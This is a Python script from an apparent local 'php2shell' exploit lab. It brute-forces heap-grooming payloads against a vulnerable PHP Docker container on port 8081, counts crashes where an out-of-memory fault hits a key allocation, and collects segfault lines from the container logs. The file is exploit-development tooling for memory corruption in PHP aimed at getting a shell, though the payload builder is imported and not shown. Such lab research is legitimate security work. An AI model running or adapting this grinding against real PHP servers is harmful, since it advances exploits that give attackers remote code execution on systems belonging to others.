#!/usr/bin/env python3
"""php2shell lab, oom18: full-band grind, no bsearch.

oom17 exposed the boundary bug: hi=65512 never tested; E teleports a few KB
per Docker VM generation. Fix: every boot, grind ALL ten 8B classes across
the band [65475..65511] (V=1024 key run attached). Death-alloc mix per part
(value 1152 / key 328 / param 1016 freed / chunk 4096) gives P(key)~6% per
position; 60 positions -> ~3 expected key deaths (alloc<=360). Stop at 3,
dump segfault lines from docker logs after each.
"""
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import build, restart, send, alloc_n

REMS = list(range(65511, 65474, -8))     # 65511 .. 65475
BOOTS = 6

def segfault_lines():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "80"],
                       capture_output=True, text=True)
    txt = r.stdout + r.stderr
    return [l for l in txt.splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]

def main():
    log = lambda *a: print(*a, flush=True)
    hits = 0
    for boot in range(1, BOOTS + 1):
        for rem in REMS:
            restart()
            fatal, text = send(8081, build(rem))
            a = alloc_n(text) if fatal else None
            if fatal:
                log(f"boot{boot} rem={rem}: fatal alloc={a}")
                if a is not None and a <= 360:
                    hits += 1
                    log(f"*** KEY DEATH boot={boot} rem={rem} alloc={a} ***")
                    time.sleep(2)
                    for h in segfault_lines():
                        log("SEGFAULT:", h)
                    if hits >= 3:
                        log("3 key deaths — stopping")
                        return
            else:
                log(f"boot{boot} rem={rem}: survive")
        log(f"== boot {boot} done, hits={hits} ==")
    log(f"grind finished, hits={hits}")

if __name__ == "__main__":
    main()
